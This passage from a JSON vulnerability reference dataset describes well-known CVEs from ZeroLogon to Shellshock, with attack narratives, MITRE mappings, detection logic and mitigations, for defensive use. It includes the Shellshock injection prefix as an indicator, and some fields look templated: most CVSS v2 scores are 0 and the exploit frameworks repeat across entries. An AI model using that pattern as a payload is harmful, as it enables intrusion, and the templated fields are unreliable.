    "technical_summary": "An attacker abuses flaws in AES-CFB8 usage within MS-NRPC to establish a Netlogon session with an all-zero challenge and reset a domain controller machine account password.",
    "executive_summary": "ZeroLogon can lead to complete Active Directory domain compromise within seconds.",
    "attacker_perspective": "A vulnerable domain controller is a direct path to Domain Admin-equivalent control.",
    "attack_story": "After reaching the internal network, the attacker repeatedly sends crafted Netlogon authentication attempts until successful, resets the DC machine password, dumps secrets, and takes over the domain.",
    "attack_prerequisites": [
      "Network connectivity to a vulnerable Domain Controller"
    ],
    "attack_flow": [
      "Reach DC",
      "Exploit Netlogon flaw",
      "Reset DC account password",
      "Compromise Active Directory"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      },
      {
        "technique_id": "T1003.006",
        "technique_name": "OS Credential Dumping: DCSync"
      }
    ],
    "kill_chain_phase": [
      "Privilege Escalation",
      "Credential Access"
    ],
    "affected_services": [
      "Active Directory",
      "Netlogon"
    ],
    "network_ports": [
      "135",
      "445"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [
      "Ryuk"
    ],
    "known_apt_groups": [
      "APT29"
    ],
    "real_world_campaigns": [
      "Multiple intrusions against unpatched Active Directory environments"
    ],
    "ioc_examples": [
      "Repeated failed Netlogon authentications",
      "Unexpected machine account password reset"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Windows Event Logs"
    ],
    "detection_logic": "Monitor Netlogon events, machine account password resets, and abnormal DCSync behavior.",
    "sigma_rule_summary": "Detect anomalous Netlogon authentication and machine account modifications.",
    "yara_rule_summary": "Not commonly applicable; prioritize behavioral detection.",
    "suricata_rule_summary": "Alert on suspicious MS-NRPC traffic patterns.",
    "snort_rule_summary": "Detect known ZeroLogon exploit sequences.",
    "business_impact": "Complete domain compromise and enterprise-wide attacker control.",
    "post_exploitation": [
      "DCSync",
      "Golden Ticket creation",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft patches",
      "Enable Netlogon enforcement mode",
      "Restrict DC exposure"
    ],
    "patch_information": "Install Microsoft's August 2020 security updates and enforcement phase updates.",
    "hardening_recommendations": [
      "Monitor DCs",
      "Limit network access to DCs",
      "Tier administrative accounts"
    ],
    "incident_response": [
      "Reset DC credentials",
      "Rotate KRBTGT twice",
      "Investigate DCSync activity"
    ],
    "eme_exposure_analysis": "Critical exposure where vulnerable domain controllers are reachable.",
    "eth_attack_narrative": "The attacker abuses Netlogon cryptographic weaknesses to seize control of Active Directory.",
    "etd_defender_guidance": "Patch immediately, verify enforcement mode, and monitor domain controller authentication.",
    "related_cves": [],
    "related_cwes": [
      "CWE-330"
    ],
    "related_exploits": [
      "ZeroLogon PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2020-1472",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 106,
    "cve_id": "CVE-2021-34527",
    "vulnerability_name": "PrintNightmare",
    "aliases": [
      "Windows Print Spooler RCE"
    ],
    "year": 2021,
    "published_date": "2021-07-01",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Windows Print Spooler",
    "affected_versions": [
      "Multiple supported Windows client and server versions prior to patches"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Remote Code Execution / Elevation of Privilege",
    "cwe_id": "CWE-269",
    "cvss_v2_score": 0,
    "cvss_v3_score": 8.8,
    "cvss_v4_score": null,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Improper privilege handling in the Windows Print Spooler allows attackers to execute code with SYSTEM privileges.",
    "technical_summary": "Attackers abuse printer driver installation functionality to load malicious DLLs through the Print Spooler service, leading to code execution or privilege escalation.",
    "executive_summary": "PrintNightmare affected many Windows systems and enabled rapid privilege escalation and domain compromise where Print Spooler was enabled.",
    "attacker_perspective": "Compromising the Print Spooler often provides SYSTEM privileges and a stepping stone toward domain takeover.",
    "attack_story": "After obtaining a foothold, the attacker exploits the Print Spooler, loads a malicious driver, gains SYSTEM privileges, dumps credentials, and moves laterally.",
    "attack_prerequisites": [
      "Vulnerable Print Spooler service",
      "Ability to reach the target"
    ],
    "attack_flow": [
      "Identify vulnerable host",
      "Trigger spooler flaw",
      "Load malicious DLL",
      "Gain SYSTEM access"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      },
      {
        "technique_id": "T1574.002",
        "technique_name": "Hijack Execution Flow: DLL Side-Loading"
      }
    ],
    "kill_chain_phase": [
      "Privilege Escalation",
      "Execution"
    ],
    "affected_services": [
      "Print Spooler"
    ],
    "network_ports": [
      "445"
    ],
    "authentication_required": "User",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [
      "Magniber"
    ],
    "known_apt_groups": [
      "APT29"
    ],
    "real_world_campaigns": [
      "Post-disclosure exploitation of Windows domains"
    ],
    "ioc_examples": [
      "spoolsv.exe loading unexpected DLLs",
      "New printer drivers from untrusted locations"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Sysmon",
      "Windows Event Logs"
    ],
    "detection_logic": "Monitor spoolsv.exe for suspicious child processes, unsigned DLL loading, and abnormal printer driver installation events.",
    "sigma_rule_summary": "Detect suspicious spoolsv.exe behavior and driver installation.",
    "yara_rule_summary": "Identify known malicious printer driver payloads.",
    "suricata_rule_summary": "Detect SMB traffic associated with remote driver delivery where applicable.",
    "snort_rule_summary": "Alert on known exploitation patterns targeting Print Spooler.",
    "business_impact": "SYSTEM compromise, credential theft, lateral movement, and potential domain compromise.",
    "post_exploitation": [
      "Credential dumping",
      "Persistence",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft patches",
      "Disable Print Spooler where unnecessary",
      "Restrict printer driver installation"
    ],
    "patch_information": "Install Microsoft's July 2021 security updates and subsequent hardening updates.",
    "hardening_recommendations": [
      "Disable Print Spooler on domain controllers",
      "Use Point and Print restrictions",
      "Monitor spooler activity"
    ],
    "incident_response": [
      "Review spooler logs",
      "Remove malicious drivers",
      "Rotate compromised credentials"
    ],
    "eme_exposure_analysis": "High exposure where Print Spooler remains enabled on critical servers.",
    "eth_attack_narrative": "The attacker abuses Print Spooler functionality to execute a malicious DLL as SYSTEM and expand access.",
    "etd_defender_guidance": "Patch all systems, disable unnecessary spooler services, and continuously monitor spoolsv.exe.",
    "related_cves": [
      "CVE-2021-1675"
    ],
    "related_cwes": [
      "CWE-269"
    ],
    "related_exploits": [
      "PrintNightmare PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-34527",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 107,
    "cve_id": "CVE-2020-0796",
    "vulnerability_name": "SMBGhost",
    "aliases": [
      "CoronaBlue"
    ],
    "year": 2020,
    "published_date": "2020-03-12",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Windows SMBv3",
    "affected_versions": [
      "Windows 10 1903",
      "Windows 10 1909",
      "Windows Server 1903",
      "Windows Server 1909"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-787",
    "cvss_v2_score": 0,
    "cvss_v3_score": 10,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "A flaw in SMBv3 compression handling allows remote code execution.",
    "technical_summary": "Improper processing of compressed SMBv3 packets can result in kernel memory corruption, enabling arbitrary code execution.",
    "executive_summary": "Internet- or network-exposed vulnerable SMB services may be remotely compromised without user interaction.",
    "attacker_perspective": "A successful exploit can provide SYSTEM-level execution and facilitate wormable propagation.",
    "attack_story": "The attacker discovers a vulnerable SMB service, sends crafted compressed SMB packets, gains kernel-level execution, installs persistence, and pivots through the network.",
    "attack_prerequisites": [
      "Reachable vulnerable SMBv3 service"
    ],
    "attack_flow": [
      "Scan for port 445",
      "Send crafted SMBv3 packets",
      "Achieve kernel RCE",
      "Establish persistence"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Execution"
    ],
    "affected_services": [
      "SMBv3"
    ],
    "network_ports": [
      "445"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Public exploitation and proof-of-concept activity following disclosure"
    ],
    "ioc_examples": [
      "Unusual SMB compressed traffic",
      "Unexpected kernel crashes during exploit attempts"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Sysmon",
      "Firewall"
    ],
    "detection_logic": "Monitor inbound SMBv3 traffic, kernel crashes, suspicious SMB compression activity, and anomalous processes spawned after SMB exploitation.",
    "sigma_rule_summary": "Detect suspicious SMB-related process activity and post-exploitation behavior.",
    "yara_rule_summary": "Identify payloads commonly delivered after SMBGhost exploitation.",
    "suricata_rule_summary": "Alert on malformed or exploit-like SMBv3 compression traffic.",
    "snort_rule_summary": "Detect signatures associated with SMBGhost exploitation attempts.",
    "business_impact": "Remote compromise of Windows systems, service disruption, and lateral movement.",
    "post_exploitation": [
      "SYSTEM access",
      "Credential theft",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft security updates",
      "Disable SMB compression if appropriate",
      "Restrict SMB exposure"
    ],
    "patch_information": "Install Microsoft's March 2020 security updates.",
    "hardening_recommendations": [
      "Block SMB from untrusted networks",
      "Segment internal networks",
      "Monitor SMB services"
    ],
    "incident_response": [
      "Isolate affected hosts",
      "Review SMB logs",
      "Patch and verify remediation"
    ],
    "eme_exposure_analysis": "Critical where vulnerable SMBv3 systems are exposed internally or externally.",
    "eth_attack_narrative": "The attacker exploits SMBv3 packet compression to obtain kernel-level execution and expand across the environment.",
    "etd_defender_guidance": "Patch immediately, restrict SMB exposure, and monitor SMB traffic for exploitation indicators.",
    "related_cves": [],
    "related_cwes": [
      "CWE-787"
    ],
    "related_exploits": [
      "SMBGhost PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2020-0796",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 108,
    "cve_id": "CVE-2022-30190",
    "vulnerability_name": "Follina",
    "aliases": [
      "Microsoft Support Diagnostic Tool RCE"
    ],
    "year": 2022,
    "published_date": "2022-05-30",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Microsoft Windows / Microsoft Office",
    "affected_versions": [
      "Supported Windows versions with vulnerable MSDT behavior"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-94",
    "cvss_v2_score": 0,
    "cvss_v3_score": 7.8,
    "cvss_v4_score": null,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "A crafted Office document can invoke the Microsoft Support Diagnostic Tool (MSDT) and execute attacker-controlled code.",
    "technical_summary": "The ms-msdt protocol handler can be abused through malicious Office documents or templates to execute commands without enabling macros.",
    "executive_summary": "Follina enabled widespread phishing campaigns because it bypassed macro-based defenses and required minimal user interaction.",
    "attacker_perspective": "A convincing document is often enough to gain code execution on the victim's workstation.",
    "attack_story": "The victim opens or previews a malicious document. Office invokes MSDT via the protocol handler, allowing attacker-controlled commands to execute and establishing an initial foothold.",
    "attack_prerequisites": [
      "Victim receives crafted Office document",
      "MSDT protocol handler available"
    ],
    "attack_flow": [
      "Deliver document",
      "Invoke ms-msdt",
      "Execute commands",
      "Deploy payload"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1204.002",
        "technique_name": "User Execution: Malicious File"
      },
      {
        "technique_id": "T1059",
        "technique_name": "Command and Scripting Interpreter"
      }
    ],
    "kill_chain_phase": [
      "Delivery",
      "Execution"
    ],
    "affected_services": [
      "Microsoft Office",
      "MSDT"
    ],
    "network_ports": [
      "80",
      "443"
    ],
    "authentication_required": "None",
    "user_interaction": "Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [
      "QakBot",
      "Bumblebee"
    ],
    "known_ransomware": [
      "Black Basta"
    ],
    "known_apt_groups": [
      "TA570"
    ],
    "real_world_campaigns": [
      "Multiple phishing campaigns in 2022"
    ],
    "ioc_examples": [
      "msdt.exe spawned by WINWORD.EXE",
      "Suspicious ms-msdt URIs"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Sysmon",
      "Windows Event Logs"
    ],
    "detection_logic": "Detect Office applications spawning msdt.exe, powershell.exe, or cmd.exe and monitor ms-msdt protocol invocations.",
    "sigma_rule_summary": "Detect Office spawning MSDT or script interpreters.",
    "yara_rule_summary": "Identify malicious document templates and embedded exploit artifacts.",
    "suricata_rule_summary": "Inspect HTTP traffic associated with malicious remote templates.",
    "snort_rule_summary": "Alert on known Follina delivery patterns.",
    "business_impact": "Initial access, malware deployment, credential theft, and ransomware infection.",
    "post_exploitation": [
      "Payload execution",
      "Credential theft",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft updates",
      "Disable MSDT protocol where appropriate",
      "Block suspicious Office child processes"
    ],
    "patch_information": "Install Microsoft's June 2022 security updates.",
    "hardening_recommendations": [
      "Use Attack Surface Reduction rules",
      "Disable unnecessary protocol handlers",
      "Harden Office"
    ],
    "incident_response": [
      "Collect Office and EDR telemetry",
      "Isolate affected hosts",
      "Reset compromised credentials"
    ],
    "eme_exposure_analysis": "High risk for organizations relying on Office email workflows.",
    "eth_attack_narrative": "The attacker weaponizes a document to trigger MSDT and execute code without relying on macros.",
    "etd_defender_guidance": "Patch systems, monitor Office child processes, and block suspicious protocol handler execution.",
    "related_cves": [],
    "related_cwes": [
      "CWE-94"
    ],
    "related_exploits": [
      "Follina PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2022-30190",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 109,
    "cve_id": "CVE-2022-0847",
    "vulnerability_name": "Dirty Pipe",
    "aliases": [
      "Linux Dirty Pipe"
    ],
    "year": 2022,
    "published_date": "2022-03-07",
    "last_updated": "2024-01-09",
    "vendor": "Linux",
    "product": "Linux Kernel",
    "affected_versions": [
      "Linux kernel 5.8 through versions before vendor fixes"
    ],
    "platforms": [
      "Linux",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Local Privilege Escalation",
    "cwe_id": "CWE-269",
    "cvss_v2_score": 0,
    "cvss_v3_score": 7.8,
    "cvss_v4_score": null,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "A flaw in the Linux kernel pipe buffer implementation allows overwriting read-only files and may enable local privilege escalation.",
    "technical_summary": "Improper initialization of pipe buffer flags permits attackers to overwrite page cache contents without directly modifying the underlying file.",
    "executive_summary": "Dirty Pipe allows local users to gain elevated privileges or tamper with protected files on vulnerable Linux systems.",
    "attacker_perspective": "After obtaining local access, I can overwrite sensitive files and often elevate privileges rapidly.",
    "attack_story": "An attacker gains low-privilege access, exploits Dirty Pipe to modify protected files, escalates privileges, and establishes persistence.",
    "attack_prerequisites": [
      "Local access to a vulnerable Linux system"
    ],
    "attack_flow": [
      "Gain local access",
      "Exploit pipe buffer flaw",
      "Overwrite protected file",
      "Escalate privileges"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "kill_chain_phase": [
      "Privilege Escalation"
    ],
    "affected_services": [
      "Linux Kernel"
    ],
    "network_ports": [],
    "authentication_required": "User",
    "user_interaction": "Not Required",
    "remote_exploitable": "No",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "ExploitDB",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Observed post-disclosure privilege escalation activity"
    ],
    "ioc_examples": [
      "Unexpected modification of protected files",
      "Unauthorized changes to root-owned files"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Sysmon"
    ],
    "detection_logic": "Monitor for suspicious writes to protected files, unexpected privilege escalation, and execution of known exploit binaries.",
    "sigma_rule_summary": "Detect abnormal privilege escalation and protected file modification.",
    "yara_rule_summary": "Identify known Dirty Pipe exploit binaries where applicable.",
    "suricata_rule_summary": "Not generally applicable because exploitation is local.",
    "snort_rule_summary": "Not generally applicable because exploitation is local.",
    "business_impact": "Privilege escalation can lead to full host compromise, credential theft, and persistence.",
    "post_exploitation": [
      "Root access",
      "Persistence",
      "Credential theft"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply vendor kernel updates",
      "Restrict untrusted local access",
      "Monitor privilege escalation activity"
    ],
    "patch_information": "Update to a patched Linux kernel release provided by your distribution.",
    "hardening_recommendations": [
      "Apply kernel updates promptly",
      "Minimize local shell access",
      "Use endpoint monitoring"
    ],
    "incident_response": [
      "Identify vulnerable hosts",
      "Patch affected kernels",
      "Review logs for privilege escalation"
    ],
    "eme_exposure_analysis": "High risk on Linux systems where attackers can obtain local execution.",
    "eth_attack_narrative": "The attacker abuses a kernel pipe buffer flaw to overwrite protected files and obtain elevated privileges.",
    "etd_defender_guidance": "Prioritize kernel updates and monitor for abnormal privilege escalation events.",
    "related_cves": [],
    "related_cwes": [
      "CWE-269"
    ],
    "related_exploits": [
      "Dirty Pipe PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2022-0847",
      "https://dirtypipe.cm4all.com/"
    ]
  },
  {
    "id": 110,
    "cve_id": "CVE-2016-5195",
    "vulnerability_name": "Dirty COW",
    "aliases": [
      "Dirty Copy-On-Write"
    ],
    "year": 2016,
    "published_date": "2016-10-19",
    "last_updated": "2024-01-09",
    "vendor": "Linux",
    "product": "Linux Kernel",
    "affected_versions": [
      "Multiple Linux kernel versions prior to vendor patches"
    ],
    "platforms": [
      "Linux",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Local Privilege Escalation",
    "cwe_id": "CWE-362",
    "cvss_v2_score": 0,
    "cvss_v3_score": 7.8,
    "cvss_v4_score": null,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "A race condition in the copy-on-write mechanism allows local users to gain elevated privileges.",
    "technical_summary": "The flaw permits writes to otherwise read-only memory mappings by exploiting a race in memory management.",
    "executive_summary": "Dirty COW is a widely exploited Linux kernel privilege-escalation vulnerability affecting numerous distributions.",
    "attacker_perspective": "After obtaining local code execution, I can become root quickly.",
    "attack_story": "A low-privileged user executes the exploit, overwrites protected memory, gains root privileges, and installs persistence.",
    "attack_prerequisites": [
      "Local access to a vulnerable Linux system"
    ],
    "attack_flow": [
      "Gain local access",
      "Trigger race condition",
      "Overwrite protected memory",
      "Obtain root"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "kill_chain_phase": [
      "Privilege Escalation"
    ],
    "affected_services": [
      "Linux Kernel"
    ],
    "network_ports": [],
    "authentication_required": "User",
    "user_interaction": "Not Required",
    "remote_exploitable": "No",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "ExploitDB",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Observed across multiple Linux intrusions"
    ],
    "ioc_examples": [
      "Unexpected SUID changes",
      "Unauthorized root shell creation"
    ],
    "detection_sources": [
      "EDR",
      "SIEM"
    ],
    "detection_logic": "Monitor privilege escalation events and unexpected modification of privileged binaries.",
    "sigma_rule_summary": "Detect abnormal root privilege acquisition.",
    "yara_rule_summary": "Identify known Dirty COW exploit binaries.",
    "suricata_rule_summary": "Not applicable to local exploitation.",
    "snort_rule_summary": "Not applicable to local exploitation.",
    "business_impact": "Full system compromise after local access.",
    "post_exploitation": [
      "Root access",
      "Persistence",
      "Credential theft"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply kernel updates",
      "Restrict local access",
      "Monitor privileged file integrity"
    ],
    "patch_information": "Install vendor-provided patched Linux kernels.",
    "hardening_recommendations": [
      "Timely patching",
      "Least privilege",
      "File integrity monitoring"
    ],
    "incident_response": [
      "Patch affected systems",
      "Review root-level changes",
      "Rotate sensitive credentials"
    ],
    "eme_exposure_analysis": "High on unpatched Linux hosts where attackers gain local execution.",
    "eth_attack_narrative": "The attacker exploits a kernel race condition to elevate privileges to root.",
    "etd_defender_guidance": "Patch kernels promptly and monitor for privilege escalation behavior.",
    "related_cves": [],
    "related_cwes": [
      "CWE-362"
    ],
    "related_exploits": [
      "Dirty COW PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2016-5195",
      "https://dirtycow.ninja/"
    ]
  },
  {
    "id": 111,
    "cve_id": "CVE-2014-0160",
    "vulnerability_name": "Heartbleed",
    "aliases": [
      "OpenSSL Heartbeat Information Disclosure"
    ],
    "year": 2014,
    "published_date": "2014-04-07",
    "last_updated": "2024-01-09",
    "vendor": "OpenSSL",
    "product": "OpenSSL",
    "affected_versions": [
      "OpenSSL 1.0.1 through 1.0.1f",
      "OpenSSL 1.0.2-beta"
    ],
    "platforms": [
      "Windows",
      "Linux",
      "macOS",
      "AWS",
      "Azure",
      "GCP",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Information Disclosure",
    "cwe_id": "CWE-125",
    "cvss_v2_score": 5,
    "cvss_v3_score": 7.5,
    "cvss_v4_score": null,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "description": "A bounds-check failure in the TLS Heartbeat extension allows remote attackers to read process memory from affected OpenSSL servers or clients.",
    "technical_summary": "A malformed heartbeat request can cause OpenSSL to return up to 64 KB of process memory, potentially exposing credentials, session cookies, and private keys.",
    "executive_summary": "Heartbleed exposed sensitive memory from millions of internet-facing systems and required emergency patching and credential rotation.",
    "attacker_perspective": "Repeated requests can harvest valuable secrets without authentication or noticeable service disruption.",
    "attack_story": "An attacker repeatedly sends crafted heartbeat requests, extracts leaked memory, discovers credentials and secrets, then uses them to access protected systems.",
    "attack_prerequisites": [
      "Target uses a vulnerable OpenSSL version",
      "TLS service is reachable"
    ],
    "attack_flow": [
      "Identify TLS service",
      "Send malformed heartbeat request",
      "Receive leaked memory",
      "Extract sensitive information"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "kill_chain_phase": [
      "Reconnaissance",
      "Credential Access"
    ],
    "affected_services": [
      "HTTPS",
      "TLS",
      "VPN",
      "Mail Servers"
    ],
    "network_ports": [
      "443",
      "465",
      "993",
      "995"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Large-scale internet scanning after public disclosure"
    ],
    "ioc_examples": [
      "Repeated malformed TLS heartbeat requests",
      "Unexpected memory disclosure during TLS sessions"
    ],
    "detection_sources": [
      "IDS/IPS",
      "Firewall",
      "SIEM"
    ],
    "detection_logic": "Identify malformed heartbeat traffic and verify vulnerable OpenSSL versions through asset inventory and scanning.",
    "sigma_rule_summary": "Correlate vulnerable asset inventory with anomalous TLS heartbeat activity.",
    "yara_rule_summary": "Not typically applicable because exploitation occurs over the network.",
    "suricata_rule_summary": "Detect malformed TLS heartbeat requests indicative of Heartbleed exploitation.",
    "snort_rule_summary": "Alert on Heartbleed heartbeat exploit signatures.",
    "business_impact": "Exposure of credentials, session tokens, cryptographic keys, and confidential information.",
    "post_exploitation": [
      "Credential reuse",
      "Session hijacking",
      "Data theft"
    ],
    "privilege_escalation_possible": "No",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Upgrade OpenSSL",
      "Replace exposed certificates",
      "Rotate credentials and session tokens"
    ],
    "patch_information": "Upgrade to OpenSSL 1.0.1g or a vendor-patched release.",
    "hardening_recommendations": [
      "Maintain TLS libraries",
      "Enable continuous vulnerability scanning",
      "Use certificate lifecycle management"
    ],
    "incident_response": [
      "Patch affected systems",
      "Replace certificates",
      "Reset passwords and invalidate sessions"
    ],
    "eme_exposure_analysis": "High where vulnerable OpenSSL libraries protect internet-facing services.",
    "eth_attack_narrative": "The attacker harvests sensitive memory over TLS to recover credentials and cryptographic material.",
    "etd_defender_guidance": "Patch immediately, rotate certificates and credentials, and scan all exposed TLS services.",
    "related_cves": [],
    "related_cwes": [
      "CWE-125"
    ],
    "related_exploits": [
      "Heartbleed PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2014-0160",
      "https://heartbleed.com/"
    ]
  },
  {
    "id": 112,
    "cve_id": "CVE-2014-6271",
    "vulnerability_name": "Shellshock",
    "aliases": [
      "Bash Environment Variable Command Injection"
    ],
    "year": 2014,
    "published_date": "2014-09-24",
    "last_updated": "2024-01-09",
    "vendor": "GNU",
    "product": "Bash",
    "affected_versions": [
      "GNU Bash before patched releases for CVE-2014-6271"
    ],
    "platforms": [
      "Linux",
      "macOS",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-78",
    "cvss_v2_score": 10,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "description": "GNU Bash improperly processes environment variables containing function definitions, allowing command injection.",
    "technical_summary": "Attackers can inject arbitrary commands into environment variables processed by Bash, affecting CGI applications, SSH configurations, DHCP clients, and other services invoking Bash.",
    "executive_summary": "Shellshock enabled widespread remote compromise of Unix-like systems and embedded devices shortly after disclosure.",
    "attacker_perspective": "Any service exposing Bash through user-controlled input can become an easy remote code execution target.",
    "attack_story": "The attacker identifies a vulnerable CGI endpoint, injects a crafted User-Agent header, executes arbitrary commands, installs a backdoor, and pivots further into the environment.",
    "attack_prerequisites": [
      "Target invokes vulnerable Bash from external input"
    ],
    "attack_flow": [
      "Identify vulnerable service",
      "Send malicious environment variable",
      "Trigger Bash command execution",
      "Deploy payload"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      },
      {
        "technique_id": "T1059.004",
        "technique_name": "Unix Shell"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Execution"
    ],
    "affected_services": [
      "Apache CGI",
      "SSH",
      "DHCP",
      "Web Applications"
    ],
    "network_ports": [
      "80",
      "443",
      "22"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "ExploitDB",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [
      "Linux.Darlloz",
      "Mayhem"
    ],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Internet-wide Shellshock scanning in 2014"
    ],
    "ioc_examples": [
      "() { :;};",
      "Unexpected bash child processes from web servers"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "WAF",
      "Firewall"
    ],
    "detection_logic": "Detect Shellshock payload patterns in HTTP headers and monitor web server processes spawning bash unexpectedly.",
    "sigma_rule_summary": "Detect Apache or CGI processes launching bash or shell interpreters.",
    "yara_rule_summary": "Identify common Shellshock payload scripts and dropped malware.",
    "suricata_rule_summary": "Alert on HTTP headers containing Shellshock exploit syntax.",
    "snort_rule_summary": "Detect Shellshock command injection signatures.",
    "business_impact": "Remote compromise, credential theft, botnet enrollment, and data loss.",
    "post_exploitation": [
      "Backdoor installation",
      "Credential theft",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Bash security updates",
      "Disable unnecessary CGI",
      "Filter malicious headers"
    ],
    "patch_information": "Upgrade to vendor-patched Bash packages addressing CVE-2014-6271 and follow-on fixes.",
    "hardening_recommendations": [
      "Reduce CGI usage",
      "Harden exposed services",
      "Maintain vulnerability scanning"
    ],
    "incident_response": [
      "Patch affected hosts",
      "Review web logs",
      "Remove persistence and rotate credentials"
    ],
    "eme_exposure_analysis": "High where Bash is exposed through web applications or network services.",
